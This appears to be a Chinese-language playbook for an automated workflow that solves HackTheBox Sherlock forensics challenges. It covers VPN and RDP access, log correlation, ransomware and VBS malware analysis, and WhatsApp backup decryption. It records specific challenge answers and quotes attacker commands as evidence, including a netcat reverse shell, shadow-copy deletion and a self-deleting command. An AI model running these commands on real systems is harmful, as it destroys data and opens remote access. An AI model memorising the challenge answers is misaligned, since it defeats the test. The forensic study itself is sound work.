| 横向 IP | Security 4624 LogonType 3 NTLM + WorkstationName；SharePoint audit ClientIP；netflow 大流量对 |
| C2 域/beacon | Sysmon EID22 DNS + EID3 网络 + DNS resolver（A 查询 193.42.33.x 段） |
| exfil 域名 | DNS resolver 解析可疑 IP → 域名；netflow 大字节流对 |
| 卷序列号/主机指纹 | Sysmon EID1 wmic `Details` |

**🔴 核心坑（VelvetThrone 实测）**：
- **API 提交通道**：`POST https://labs.hackthebox.com/api/v4/sherlocks/{id}/tasks/{tid}/flag` body `{"flag":"..."}`；**tid 用任务 id（20637 类）不是序号**——序号会 404 "Are you lost?" 页面！201=对；先 GET `/api/v4/sherlocks/{id}` 确认 id 正确
- **多日志时区混杂**：Okta/DNS/Defender/netflow/SharePoint = UTC；**Security 4688/4624 + Sysmon = 本地时间（UTC-6，Austin）**！同事件跨源差 6 小时，对齐后再拼时间线
- **RC4 自定义密钥派生**：key = **SHA1(hostname + "_" + volume_serial) 的 raw digest**（下划线分隔符！hex 字符串/大小写/无下划线全错）；C2 文件头 `C2SESS\x01\x00` 8 字节，偏移 8 起是密文
- **DNS 隐蔽信道抠字节**：`<8hex>.t.<c2domain>` A 查询，**每个标签只取首字节 XOR 0x17** = 1 字符，按时间序拼接（整串 XOR / 全 4 字节都不出明文）
- **netflow 满格字节**：512MB/流 = 分块上传；40+ 次 ≈ 25GB，与 C2 JSON `bytes` 字段交叉验证
- **干扰项识别**：pentest report 里 1 条"真手法预告"（RC4+SHA1 派生+服务持久化）当提示用但**名字全对不上**（HealthMonitorSvc≠ProxyHlthSvc）；APT28 IOC 同段（193.42.33.100 vs 真 C2 .114/.118）是误导向；Defender 循环警报（Mimikatz/Wacatac/PUP）= 噪音，真警报 2 条且 **Suppressed（实时防护被禁）= 攻击得逞信号**
- 持久化判断：字符串含 `\ProxyHlthSvc`+CreateService+SERVICE_AUTO_START+sc.exe → **T1543.003**（服务创建）；有 Run 键字符串 ≠ 答案，看执行路径（msiexec 父进程 = MSI 装服务）

## 7.10 VM 型 Sherlock（play_methods=["vm"]，AWS_Bucketware Hard 全通）

> 题型：无附件下载（`download_link` 返回 400 "Sherlock does not have any files to download"），证据在 HTB 拉起的靶机 VM 上。API 元数据 `play_methods:["vm"]` 即此类。

**全流程（实测 15 分钟）**：
1. **确认类型**：`GET /api/v4/sherlocks/{id}` 看 `play_methods`；有 "vm" → 无 zip，走本节
2. **拉实例**：Playwright 开 `app.hackthebox.com/sherlocks/{slug}`（浏览器已登录）→ 点 **Start Sherlock** → 抓到真实端点 `POST https://labs.hackthebox.com/api/v4/challenge/start/vm/{id}` → 返回 `{"username":"analyst","password":"123"}`
3. **拿 IP**：轮询 `GET /api/v4/sherlocks/{id}/play` → `data.play_info.{status,ip}`；status 从 deploying→ready 后 ip 出现
4. **连 VPN**：UI 的 Connect 面板 → Sherlocks → OpenVPN → Download VPN 下载 `sherlocks_eu-dedivip-3.ovpn`（落在 `.playwright-mcp/`）→ scp 到 Kali → `openvpn --config xxx.ovpn --daemon --log ...` 等 tun0 起来；`connections/servers?product=sherlocks` 只列服务器不给配置，**别猜 download 端点**（404）
5. **进靶机**：22/3389 开放；Linux 靶机直接 `sshpass -p <pw> ssh user@ip`（zip 常在 `~/Desktop/AWSLogs.zip`，先 `ls -la ~/ Desktop/` 摸清再解压）；scp 整目录拉回 Kali 本地用 jq 分析
6. **CloudTrail 分析套路**：`jq -r '.Records[]? | [.eventTime, (.userIdentity.userName // .userIdentity.sessionContext.sessionIssuer.userName // .userIdentity.type), .eventName, (.errorCode//"OK"), (.requestParameters|tostring)] | @tsv' *.json | sort` 一把出全时间线
7. **收尾**：断 VPN（用 pid 文件 `kill`，别 `pkill -f` —— 见 `command-safety-red-lines` §1）。
   🔴 **回收资源必须用 `POST /api/v4/vm/terminate` + body `{"machine_id":<sherlock_id>}`**
   → `200 {"message":"Sherlock terminated.","success":true}`，槽位立即释放。
   ⚠️ **本卡早期版本此处写错了**（"terminate 无独立 API 端点，stop/end/destroy 全 404，reset 即回收"）：
   `stop/end/destroy` 确实 404，但 **`/api/v4/vm/terminate` 存在，且是唯一真正的销毁端点**
   （端点名是从 Web UI 的红色停止按钮 `htb-square-button--danger-secondary` 抓包得到的）。
   **`reset/vm/{id}` 的语义是"重启"而不是"销毁"** —— 它会重新部署 VM 并把槽位继续占住，
   于是下一个 Sherlock 起不来（见 §7.12）。

**🔴 坑（AWS_Bucketware 实测）**：
- **htb_sherlock 工具交答案被 Cloudflare 拦**：返回 HTML doctype 页面而非 JSON —— 直接 Node fetch labs API 提交（见 §8 提交通道），11 连发全 201
- **掩码是答案长度的精确提示**："last three reconnaissance API calls" 掩码 19,11,9 → GetBucketVersioning(19), ListObjects(11), GetObject(9)，而不是直觉上的 ListAccessKeys/ListServiceQuotas/GetSendQuota(14/17/12)；多个候选时用长度唯一锁定
- **"compromised identity" 取最低权限者**：hint 直说 "which one potentially has the lowest privilege"——iamadmin 是干扰项（DescribeEventAggregates 刷屏 = AWS Health 噪音），真正攻击链在 s3user 上（recon 全 AccessDenied→CreateUser×3 AccessDenied→S3 拖库+勒索信）
- **多身份别答串**：GetBucketVersioning/PutBucketVersioning(Status=Suspended)/GetObject(highprofilecoffeeorders.csv)/PutObject(ransomenote.txt) 都挂在 s3user 名下；StopLogging 挂在 iamadmin 名下但题目没问

## 7.11 Windows AD 入侵取证：pcap + 双机 evtx（SaSync Medium 17/17 全通）

> 题型：给 **两台主机的 `C:\Windows\System32\Logs\*.evtx`**（`$MFT`+`$J` 也常给）+ **一份 pcapng**，问"最早恶意活动 / 首个远程命令 / 反连时刻 / 提权命令 / 横向时刻 / 域账号 / Logon GUID / 委派技术 / 域级沦陷时刻"。
> 一句话：**evtx 给"进程/登录/服务/脚本块"的事实，pcap 给"网络动作的秒"；两者的时钟差 ~2.1s，别混用。**

### 时间源纪律（本题唯一真正的坑）

| 事件类型 | 取值来源 | 实测 |
|---|---|---|
| 端口扫描 / xp_cmdshell **命令发出** / 反连建立 | **pcap 秒** | T1 `19:26:26`、T4 `19:27:24`、T7 `19:27:59` |
| 4688 进程创建 / 4624 登录 / 4104 脚本块 / 7045 服务 | **evtx UTC 秒** | T10 `19:30:00`、T11 `19:31:01`、T15 `19:36:57` |
| 两处都有的同一事件 | **先试 pcap 那个**（作者先做的 pcap 时间线） | 4688 说 19:27:26 被拒 → `19:27:24` 通过 |

- 校准办法：找一组双源事件（如 certutil 下载、nc 执行），`evtx - pcap ≈ +2.1s`，之后按事件"能不能在 evtx 里看到"选源。
- 掩码给到秒就别报**同一事件的下一个动作**（`mkdir`、子进程）——先试"命令发出"那一秒。

### evtx 侧必查四件套

1. **4688 + CommandLine + ParentProcessName**：`sqlservr.exe` 为父 = MSSQL `xp_cmdshell`；`nc.exe 192.168.x.x 4444 -e cmd.exe` = 反连。
2. **7045（System）**：服务名随机 8 位（`vpHM`）+ `ImagePath=%systemroot%<8 位随机>.exe` = **PsExec**；配合 `$J` 里该 exe 的 `FileCreate` 秒。
3. **4104（PowerShell/Operational）**：攻击者**手敲的命令原文**（`net use n: …`、`dir C:\Users`、`Get-ADTrust -Filter *`）＋精确秒。交互 shell 不进 4104 的只有"没开 ScriptBlock 日志"的情况。
4. **4662（Security，DC 上）**：`{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}`(Get-Changes-All) / `{1131f6ad-…}`(Get-Changes) = **DCSync**。🔴 当 mimikatz/DRSUAPI **在 DC 本机以 SYSTEM 跑** 时，`SubjectUserName` 是**机器账户**（`DC2$`）而不是攻击者账号；一批会有多条，题目问的时刻取**后一批**（SaSync：19:39:37 首发、**19:39:50** 是答案）。

### 三种"无需口令拿账号/权限"的网络侧铁证

| 技术 | pcap | evtx |
|---|---|---|
| **Shadow Credentials** | LDAP modify 明文含 `CN=<目标>,CN=Users…` + `msDS-KeyCredentialLink`（未签名时 pcap 可读） | **4768 `PreAuthType=16`（PKINIT）+ `CertIssuerName=<目标账号>` + `CertSerialNumber=00`**；System 事件 **21**「certificate chain processed, but terminated in a root certificate which is not trusted」 |
| **Kerberos 约束委派 + 协议转换** | LDAP 里该账号 `msDS-AllowedToDelegateTo=HOST/<DC>` + `servicePrincipalName` | 4769 连续两条：`ServiceName=<账号自身>` 后接 **`ServiceName=<DC>$`、`TicketOptions=0x40830000`** = S4U2Self→S4U2Proxy；随后 4624 `Administrator@<域>` + 4672 全特权（该 4624 的 `LogonGuid` 就是题目要的"提权会话 Logon GUID"） |
| **DCSync** | —（本机 SYSTEM 发起，网络不可见） | 4662（见上） |

- 还差一口气时查 **`$J`（USN journal）**：`mimikatz[1].exe`（certutil 下载的中间名）、`FyPDJNvh.exe`（PsExec 服务体）、`PowerShell_transcript.*.txt` 都能定位到秒。
- 凭据填充的判定：DC 上同一秒内 `4625×N + 4776`（`Status=0xC000006A` 错口令 / `0x0` 成功）连发，**成功那条的秒**即"首个被拿下的域账号"。

### 干扰项识别

- 收尾期的 `FTK Imager` / `Exterro` / `PsExec.exe -i -s cmd.exe`（响应方在**工作站**上取证）与 `poweroff-vm-default.bat`（靶机关机）**都不是攻击**；非 SYSTEM 的系统服务重启、GPO 处理、`dsregcmd`、`mobsync` 同理。
- 日志开头一条 `1102`（清除审计日志）+ `1100` 常是**题目镜像的准备动作**，不是反取证。

## 7.12 VM 型 Sherlock 接入链：RDP 取证机 + 无 GUI 眼睛时的盲操作通道（Overlord 15/15 + Ransomware_RE 9/9 全通）

> 题型判据（两条命中即此类）：① 元数据 `play_methods: ["vm"]`；② 场景给
> `xfreerdp /v:<ipaddress> /u:letsdefend /p:'' /cert:ignore /dynamic-resolution`，
> 常附 `Malware Location: Desktop/xxx.zip`。
> **没有附件 zip 可下**，证据全在那台 Windows 分析机里（桌面 `ChallengeFile\` + `Tools\`，
> 用户目录下常有现成的 Ghidra 工程 `.gpr`）。

**五步主线**（从零到拿到样本，实测 ~10 分钟）：
1. `GET /api/v4/sherlocks/{id}` → 确认 `play_methods`；`GET .../connections/servers?product=sherlocks` → 取 `assigned.id`
2. 🔴 **每次重新下载 ovpn，绝不复用本地旧文件**（见"证书轮换"）
3. Kali 建隧道（🔴 同账号**只能有一条**，跨产品也算：先停 machines）
4. RDP 进去（🔴 强制 NLA；认证前会卡 ~50-80 s 在 Kerberos）
5. 用**盲操作通道**取件（没有 GUI 眼睛也能全自动）

### 🔴 客户端证书轮换 = 握手"静默丢弃"（本链条最大的坑）

**症状**：openvpn 日志走到 `VERIFY OK: depth=0, CN=<edge>` 就**停住**，没有 `Control Channel`；
客户端发出自己的 Certificate flight（~1.5 KB）后**服务器不再 ACK**，只见 3s/8s/15s 重传。
ping 端点通（~190 ms）、TLS Initial packet 也收得到 —— **看着像网络/MTU 问题，其实是证书过期**。

```bash
# 一条命令定生死：本地旧文件 vs API 现签的，大小相同但 md5 不同 = 已轮换
curl -s -H "Authorization: Bearer $(cat ~/.dsh/htb-token.txt)" -H "Accept: application/json" \
     https://labs.hackthebox.com/api/v4/access/ovpnfile/805/1 -o fresh.ovpn
md5sum fresh.ovpn /root/old-local.ovpn
openssl x509 -in <(sed -n '/<cert>/,/<\/cert>/p' fresh.ovpn | grep -v 'cert>') -noout -dates
```
实测 **同一天内轮换两次**（`E5B034…` → `2A15BC82…`），且新旧文件**同为 3354 字节** ——
只有 md5/日期能看出来。**先 diff 再动网络参数**：我曾先猜"同账号只允许一条 VPN"、
杀掉 machines 隧道去验证，白烧 6 次往返。

### 🔴 RDP 侧三个必知

| 现象 | 真因 | 处置 |
|---|---|---|
| `nego_process_negotiation_failure: HYBRID_REQUIRED_BY_SERVER [0x5]` | 服务器强制 **NLA** | 用 `/sec:nla`（`/sec:tls` 必失败） |
| 认证前卡 ~50-80 s，日志刷 `Cannot contact any KDC for realm '<DOMAIN>.HTB'` | winpr 先试 Kerberos 再回退 NTLM；HTB 内网没有该域 DNS | **等着别杀**（18 s 就杀=白等）；加 `/d:""` 也挡不住 |
| `import -window root` 截出 296 B 纯黑但窗口确实在 | Xvfb 下没有 WM，root 窗口无内容 | 抓**窗口 id**：`WID=$(xdotool search --name "FreeRDP:" \| head -1); import -window $WID out.png` |

### 🔴 盲操作通道（可复用资产：无 GUI 眼睛也能执行命令 + 外带文件）

原理：`xdotool` 注入 `Win+R` 盲执行命令，输出写进 xfreerdp 的**驱动器重定向**目录 `\\tsclient\share`，
再从 Kali 读回来。**不需要看屏幕。**

`/root/rdp-up.sh`（起会话并等窗口出现）：
```bash
IP="${1:-10.129.250.165}"; D="${2:-:95}"; W="${3:-150}"
mkdir -p /tmp/share; chmod 777 /tmp/share
[ -f /tmp/rdp95.pid ] && kill "$(cat /tmp/rdp95.pid)" 2>/dev/null; sleep 1
[ -e "/tmp/.X11-unix/X${D#:}" ] || { Xvfb "$D" -screen 0 1440x900x24 >/tmp/xvfb.log 2>&1 & sleep 3; }
export DISPLAY="$D"
nohup xfreerdp /v:"$IP" /u:letsdefend /d:"" /p:"" /cert:ignore /size:1440x860 \
  /drive:share,/tmp/share /sec:nla +auto-reconnect /log-level:INFO >/tmp/rdp95.log 2>&1 &
echo $! > /tmp/rdp95.pid
for i in $(seq 1 "$W"); do xdotool search --class freerdp >/dev/null 2>&1 && { echo "win after ${i}s"; break; }; sleep 1; done
```
`/root/rdp-cmd.sh`（盲执行一条 Windows 命令）：
```bash
D="${1:-:95}"; shift; CMD="$*"; export DISPLAY="$D"
WID=$(xdotool search --name "FreeRDP:" | head -1)
xdotool mousemove --window "$WID" 720 430; xdotool click 1; sleep 0.7   # 无 WM，靠点击给焦点
xdotool key --clearmodifiers super+r; sleep 1.5                        # Win+R
xdotool type --delay 25 -- "$CMD"; sleep 1; xdotool key --clearmodifiers Return
sleep "${RDP_WAIT:-4}"
```
用法（摸底 + 取件，输出一律落文件再回读，别依赖屏幕）：
```bash
xdotool key --clearmodifiers Escape   # 先关可能抢焦点的 "Networks" 提示框
bash /root/rdp-cmd.sh :95 'cmd /c dir C:\Users\letsdefend\Desktop > \\tsclient\share\r.txt 2>&1'
bash /root/rdp-cmd.sh :95 'cmd /c copy /Y C:\Users\letsdefend\Desktop\malware.zip \\tsclient\share\malware.zip > \\tsclient\share\cp.txt 2>&1'
cat /tmp/share/r.txt; ls -la /tmp/share/malware.zip
```
- `\\tsclient\share` 走 **FUSE**（会警告 "library too old"，可忽略）
- VM 内 zip 的常见口令是 **`infected`**（`hacktheblue` 是 HTB 附件 zip 的口令，两者不同，都要试）

### 🔴 VM 槽位：一个账号同时只有一台 Sherlock VM（本链条第二常见的坑）

**症状**：`POST /challenge/start/vm/{id}` → **403** `{"message":"You already have an active instance"}`，
但 `GET /sherlocks/{id}/play` 的 `play_info` 是**空的**（或属于**另一道已通关的题**）。

**根因与处置**：
1. 🔴 **`reset/vm/{id}` 是"重启"不是"销毁"** —— 它把那道题的 VM 重新部署（`resetting` → `ready`，**IP 会变**），
   槽位继续被占。所以"先 reset 掉旧题"**解决不了**，反而是在给它续命。
2. 🔴 **停止端点 = `POST /api/v4/vm/terminate`，body `{"machine_id": <sherlock_id>}`**
   → `200 {"message":"Sherlock terminated.","success":true}`，槽位立刻释放。
   `stop` / `end` / `destroy` 系列**全部 404**；端点名只能从 UI 抓包（Play 面板里 IP 旁边那个
   无名 danger 图标 = `htb-square-button--danger-secondary`）→ 点它然后
   `browser_network_requests` 过滤 `labs.hackthebox.com/api`。
3. 🔴 **反复轮询 `play` 会给 VM 续命**：实测 1677 的 IP 在轮询中 `.55 → .57` 反复变化 = 实例被反复部署。
   想让它自然过期就**别碰它**。
4. **每道 Sherlock 一台独立 VM**（实测：1677 的盒子桌面上只有 `malware.zip`、**没有** `ChallengeFile\` 目录；
   1614 的才有 `ChallengeFile\sample.7z`）→ 不能"借"另一题的 VM 蒙混。
5. UI 的 **`Start Sherlock` 按钮可能不发任何请求**（点了没反应、控制台无报错）→ 直接走 API，别依赖按钮。

### 🔴 三个 HTB API 坑（均实测）

| 现象 | 真因 | 处置 |
|---|---|---|
| `GET /access/ovpnfile/{id}/1` → **400** | `Accept: */*` 被拒 | 必须 `Accept: application/json` |
| 同上仍 **400** | Kali 上 **machines VPN 还在连** → 跨产品单隧道 | 先 `kill $(cat /root/ovpn.pid)` 再请求 |
| `POST /challenge/start/vm/{id}` → **403** `{"message":"You already have an active instance"}` | 不一定是错 | 先 `GET /sherlocks/{id}/play`：本例 VM **已经 ready**，直接用返回的 ip |

**收尾**（必做，否则占着 HTB 资源与隧道配额）：
```bash
for p in $(pgrep -x xfreerdp); do kill -9 "$p"; done   # 不要 pkill -f（见 command-safety-red-lines §1）
kill $(cat /root/ovpn1677.pid); sleep 3
openvpn --config /root/machines_us-dedivip-5.ovpn --daemon --log /root/ovpn-machines.log --writepid /root/ovpn.pid
# HTB 侧：POST /api/v4/vm/terminate  body {"machine_id": <sherlock_id>}  → 200 "Sherlock terminated."
#（不要用 reset/vm/{id}：那是重启，会把槽位继续占住）
```

## 7.13 PE 勒索软件逆向：固定动线（Ransomware_Reverse_Engineering Hard 9/9）

> 题型：给一个 PE（本例 **Mallox**，146 KB，PE32 i386 GUI，5 节区），题目反复问这几类：
> main 开头加载的 DLL / 删几个注册表键 / 执行什么命令 / 几个命令行参数 / 终止几个进程 /
> 勒索邮箱 / onion 域名。
> 一句话：**先用字符串拿掉一半，再用 `xrefs_to` 从 API 反推函数，最后才开反汇编器。**

**动线（按性价比排序）**
1. **宽字符串全量筛** —— 🔴 PE 里命令行/键路径多半是 **UTF-16**，`strings -a` 一条都读不到：
   ```bash
   strings -a -el sample | grep -aiE 'bcdedit|vssadmin|onion|@[a-z]'   # -el = 16-bit LE
   strings -a -el sample | grep -a 'Image File Execution Options' | sort -u
   ```
   本例一步拿到 Q4/Q5 两条 `bcdedit` 命令、Q8 邮箱、Q9 的 56 字符 `.onion`、8 个 IFEO 键。
2. **`xrefs_to <API>` 直接定位目标函数**（不必翻函数列表）：

   | 题目在问 | 反查这个 API | 本例结果 |
   |---|---|---|
   | main 开头加载的 DLL | `LoadLibraryA`/`LoadLibraryW` | `_WinMain@16` 首处 = `PowrProf.dll` |
   | 终止几个进程 | `CreateToolhelp32Snapshot`(+`Process32NextW`/`TerminateProcess`) | `for(i=11;…)` 遍历 11 元素数组 |
   | 几个命令行参数 | `CommandLineToArgvW` | 依次比较 `-l/-d/-p/-path/-queue` = **5** |
   | 删几个注册表键 | `SHDeleteKeyW`/`RegDeleteKey*` | 见下方口径陷阱 |

3. **计数类答案双向交叉验证**：① 循环计数 / 数组字节数（`off_41E398` 44 B ÷ 4 = 11 指针）；
   ② 该 API 的**代码 xref 条数**（`SHDeleteKeyW` 11 条 code xref，第 12 条是导入 thunk）。两路一致才算确认。
4. **家族指纹**（自检答案是否合理）：Mallox = 清 **Raccine** 反勒索工具（HKCU/HKLM `SOFTWARE\Raccine`
   + EventLog\Application\Raccine + 8 个 IFEO 拦截键）+ `vssadmin /sysnative/… delete shadows /all /quiet`
   + `bcdedit /set {current} …` + **专杀数据库服务进程** + `C:\HOW TO RECOVER !!.TXT` +
   `GetUserDefaultLangID()` 命中俄/独联体语言则**不执行**（地理围栏）+ 自删除
   `cmd /c ping 127.0.0.1 && del "<自身>" >> NUL`。

### 🔴 计数口径陷阱（本题唯一被拒的答案：先问"计数单位是什么"）

`sub_40693F` 内 `SHDeleteKeyW` 的**代码 xref 恰好 11 条**（74 条指令全反汇编确认），
但标准答案是 **10** —— 作者数的是**去重后的键路径**：

```
SOFTWARE\Raccine            ← 同一字面量，喂给两个 hive
  HKEY_CURRENT_USER   → 1 次调用 ┐
  HKEY_LOCAL_MACHINE  → 1 次调用 ┘  2 次调用 = 1 个键路径
SYSTEM\...\EventLog\Application\Raccine  → 1
IFEO\vssadmin/wmic/wbadmin/bcdedit/powershell/diskshadow/net/taskkill → 8
⇒ 11 次调用 = 10 个键路径
```
- 三种口径经常不同：**调用次数 / 去重路径 / 涉及的 hive 数**。调用次数被拒 → 先试**去重**。
- `mov esi, ds:SHDeleteKeyW` 提到连续调用之前**只是编译器省字节**，与语义无关，别被它误导。
- 同类陷阱预告：进程终止数按"名单长度"还是"实际匹配数"；参数按"分支数"还是"argv 个数"。

### 🔴 掩码只能约束长度，不能验证内容

Q4/Q5 掩码 `******* /*** {*******} …` 里 `{*******}` = 9 字符 —— `{default}` 与 `{current}`
**都是 9 字符**。我按经验先填了 `{default}`，靠宽字符串直读纠正成 `{current}` 才通过。
⇒ 遇到"多个等长候选"必须**回字节**（`strings -el` / IDA `get_string`），掩码给不了这个信息。

## 7.14 脚本类样本（VBS / JS / HTA / PS1 / WSF）：先读，别反编译（Kimsuky_APT_Group Hard 7/7）

> 触发：`file` 报 `ASCII text` / `UTF-8 Unicode text`，后缀 `.vbs/.vbe/.js/.jse/.hta/.ps1/.wsf`。
> 🔴 **成本差一个数量级**：脚本样本通常**根本不需要反编译器**。本题 6.3 KB VBS **零混淆**，
> 读一遍 7 题全出，总耗时 ~6 分钟（其中 5 分钟还是 VM 接入）。
> ⇒ **先做完 `file` + 后缀判断再决定上不上工具** —— 判错类型会把 5 分钟的活做成 1 小时。

### 7.14.1 通用动线
1. `file` + 后缀 → 文本脚本就**直接读**（连 `strings` 都不必）
2. 若见到 `Chr()` / `&H` / `Execute` / `Eval` 拼接 → 先在纸上或脚本里**静态拼回**，**不要真跑**
   （本类的"混淆"九成只是数字与字符串拼接）
3. 定位**执行入口**（`Execute`/`Eval`/`WScript.Shell.Run`/`ShellExecute`）与
   **外带通道**（`Microsoft.XMLHTTP`/`WinHttp`/`MSXML2.ServerXMLHTTP`）
4. 答案几乎都是**标识符名**（函数名 / 属性名 / WMI 类 / 注册表键 / 文件名）→ 逐题对掩码长度取

### 7.14.2 VBS 恶意脚本速查（Kimsuky 实测）

| 行为 | 特征 API / 对象 | 本题函数 |
|---|---|---|
| 主机信息收集 | `winmgmts:` → `Win32_ComputerSystem` / `Win32_OperatingSystem` / `Win32_Processor` | `SyInf` |
| 杀软枚举（反分析） | `winmgmts:\root\SecurityCenter2` → `AntiVirusProduct`（`displayName`/`pathToSignedReportingExe`/`instanceGuid`/`productState`） | `AntiQuery` |
| 进程枚举 | `winmgmts:\root\cimv2` → `Select * from Win32_Process` | `QProc` |
| 特殊目录遍历 | `Shell.Application.Namespace(<CSIDL>)` → `.Self.Path`（CSIDL：0 桌面 / 5 文档 / 6 收藏 / 8 最近 / 21 开始菜单 / 38 程序 / 40 下载） | `SpDir` |
| 最近文件 | `Word.Application.RecentFiles`（`.Path`/`.Name`） | `FInf` |
| 计划任务持久化 | `Schedule.Service` → `NewTask(0)`、`Triggers.Create(2)`、`Repetition.Interval="PT60M"`、`RegisterTaskDefinition(name,def,6,,,3)`；`Author="Microsoft"`+`Hidden=True` 伪装 | `Reg` |
| base64 编码 | `Msxml2.DOMDocument` + `dataType="bin.base64"`（或 `ADODB.Stream` 转二进制） | `b64` |
| HTTP 外带 | `Microsoft.XMLHTTP`.open "POST" + `multipart/form-data; boundary=…` | `Rep` |
| 注册表改写 | `winmgmts:\root\default:StdRegProv`（`SetStringValue`/`SetDwordValue`；HKCU=&H80000001、HKLM=&H80000002） | `SetIEState` |
| **阶段二"下载即执行"** | `InternetExplorer.Application`.Navigate → `.Document.Body.InnerText` → `Execute(bt)` | 尾部 |
| 静默执行 | `WScript.FullName //b //e:vbscript <file>` | 计划任务动作 |

### 7.14.3 掩码反推技巧（本类题最省时间的一步）

答案多是标识符，**掩码长度几乎能直接定位**（本题 7 题有 5 题是这样秒杀的）：

| 掩码形状 | 答案 |
|---|---|
| `****************`（16） | `AntiVirusProduct` |
| `*****_*******`（5_7） | `Win32_Process` |
| `***.****.****`（3.4.4） | `osa.Self.Path` |
| `******.***********`（6.11） | `obWord.RecentFiles` |
| `****.***`（4.3） | `Info.txt` |
| 含 `\` 的长掩码 | 注册表**完整路径**（含 `HKCU\` 前缀**和值名**） |

### 7.14.4 🔴 坑

1. **别一上来就搭 Ghidra/IDA** —— 文本脚本用不上，会白绕一圈。
2. **别真跑样本**（本题会改 IE 注册表、建隐藏计划任务、并把本机信息外带到 C2）。
3. **计数类问题先定口径**（同 §8.3）：本题 `SyInf` 原始属性访问 **11** 个、输出标签 **9** 个，
   掩码 `*`（1 位）直接排除 11 → 取 **9**。
4. 提交含 `\` 的注册表键答案时 body 必须 `ConvertTo-Json`（见 §8 第三个提交坑）。

### 7.13.1 🔴 两个"预判陷阱"（cl0p_Malware Hard 8/8 实测，都会重复踩）

1. **语言/编译器预判别靠命名风格**：hint 里的 `do_heartbeat` / `EncrFile` / `CreateRadMe`
   （下划线+驼峰混合）看着像 **Go**，我据此准备走 `go version -m` + Go 符号恢复 ——
   实际 `nm` 一跑是 **C++ mangled**（`_Z12do_heartbeatv` / `_Z8EncrFilePc` / `_Z11CreateRadMePc`），
   是 **GCC 编译的静态链接 ELF**。
   ⇒ **`file` / `nm` 的输出永远优先于风格直觉**；拿到样本先跑
   `file` + `nm | head` + `readelf -p .comment`（看编译器版本），再决定工具链。
   ⇒ 反过来：**未剥离（not stripped）就是最大的礼物** —— `nm` 直接给全部函数地址，
   本题的"函数偏移"题（Q8）与"函数有多少个操作"题（Q2）都因此变成读表。

2. **"样本的 hash"存在同名歧义**：7z 包与解出的可执行文件**各有 SHA256，且掩码都是 64 字符**，
   长度无法区分。判据在 hint 提到的工具能开什么：
   "用 **Detect It Easy** 载入 / 上传 **VirusTotal**" → 指**可执行样本本体**，不是压缩包。
   ⇒ 遇到"sample 的 hash / 大小 / 类型"，**先问 `sample` 指哪个文件**（包还是包里的东西），
   必要时把两个 hash 都备着（本题 zip=`869f8b25…`、ELF=`09d6dab9…`，答的是后者）。

3. **补充：`strings` 的截断会骗人**。Q2 我先用
   `strings | grep -E '^/(opt|u0[0-9])$'` 只看到 `/opt`~`/u04`（grep 模式漏掉了 `/home`、`/root`），
   差点答 5；**反编译 `do_heartbeat` 才看全 7 个**。
   ⇒ **列举类问题以反编译/反汇编为准，`strings | grep` 只能当线索**（grep 模式本身就是过滤器）。

## 7.15 Android 银行木马取证：设备 triage + APK 逆向 + C2 解密（PhantomBundle Hard 15/15 全通）

> 触发：附件 = `android_triage.tar.gz`（Android `/data`）+ **pcap**；场景写 "phishing campaign / Android device /
> multi-stage malicious APK / decrypt C2 communications"。题面**明说**"disk image + PCAP + APK + 解密 C2"时，
> 四类证据源固定：①设备 DB/日志 ②APK 反编译 ③pcap ④**加密备份**。

### 7.15.1 五步主线（实测 ~3h，含踩坑）
1. **解包**：`sherlock.zip` 口令 `hacktheblue` → `android_triage.tar.gz`（271MB，Python `tarfile` 流式按需提取，
   别整包解压；用 `tarlist.txt` 建清单再 grep 路径）
2. **先看有哪些 App 目录**：`data/data/<pkg>` 的**包名本身就是线索**（拼写错误如 `com.andorid.systemui` 通常是
   恶意/仿冒包；正常 App 名不会拼错）。`data/app/<pkg>-<hash>/base.apk` 取样本
3. **APK 反编译**：Kali `jadx -d <out> <apk>`（🔴 用**绝对路径**，`/usr/share/jadx/bin/jadx` 的 wrapper 会按自身目录
   解析相对路径而报 "File not found"）。先读 `resources/AndroidManifest.xml`（service/receiver/permission/`<queries>`
   就能答"用哪个 service 常驻""下载器要拉起谁"），再读 `com/<app>/*.java`，最后才啃混淆包（`i0/ A/` 之类）
4. **C2 流量解密**：`tshark --export-objects http,<dir>` 导出全部 body → 按 `i0/*.java` 里的加解密函数复刻
   （常见 = 首 16B 随机 IV + AES-CTR，报文 Base64；**密钥往往明文落在 `shared_prefs/*.xml`**）。
   解密后逐条打印：C2 的 `commands_list` = 攻击者下发（含伪造通知文案、截屏/读剪贴板/列包/要凭据），
   设备上报 = 被窃凭据、包列表、键盘记录
5. **命令→动作映射**：混淆代码里是 `switch(str.hashCode())` 分层展开（JADX 会渲染成
   `case <hash>:` + `if (str.equals("42"))` + `switch(b2){case N:…}`）。**用两个已知命令交叉标定索引**
   （例：pcap 里 cmd `73` 的回包是通知摘要、cmd `74` 拉起登录页 → 立刻确定 `b2` 编号与 `case` 一一对应，
   再读相邻 case 就是答案）

### 7.15.2 ⭐ WhatsApp 取证（社工题的核心，且最容易漏掉"备份"）
**判据顺序**（现场 DB 空空如也 ≠ 没有证据）：
1. `data/data/com.whatsapp/databases/msgstore.db`（+`-wal`/`-shm`，**先复制再打开**，别污染原件）
2. 🔴 **`msgstore.db` 里查 `backup_changes` 表**：`('DELETE','message',N)` / `('DELETE','chat',N)` 记录=**消息被删过**，
   这就是"应该去备份里找"的信号灯
3. 🔴🔴 **`data/media/0/WhatsApp/Databases/msgstore.db.crypt14`（加密备份往往保留删除前的完整消息）**
4. 归属判定四件套：`files/me`(自身 jid+号码)、`shared_prefs/register_phone_prefs.xml`(注册号)、
   `msgstore.jid_map`(**LID ↔ 手机号** 映射，用来把 @lid 聊天翻译成号码)、
   `wa.db.wa_contacts.wa_name`(**对方 WhatsApp 推送名**，还原"伪装成某 App 的客服")；
   `wa_biz_integrity_signals.integrity_tags=[{"tag":"individual_spam"}]` 能确认哪个聊天是攻击者

### 7.15.3 ⭐⭐ crypt14 备份解密（本题唯一难点，已实测定版）
```
[1B protobuf 长度 N][1B features flag(可选, 常为 0x01)][N B protobuf BackupPrefix][ciphertext][16B GCM tag][16B md5]
```
- protobuf `c14_cipher`：`f1`cipher_version(`00 01`) `f2`key_version(`'2'`) `f3`server_salt(32B)
  `f4`google_id(16B) **`f5`IV(16B)**；另一条 `f4`(外层)=backup info（含 App 版本、features）
- **AES 密钥不在备份里，在 `data/data/com.whatsapp/files/key`**（Java 序列化 `byte[131]`，跳过 17B 序列化头+4B 长度）：
  `[0:2]cipher_ver [2:3]key_ver [3:35]server_salt [35:51]google_id [51:83]sha256(google_id) [83:99]16B 零 [99:131]★AES key`
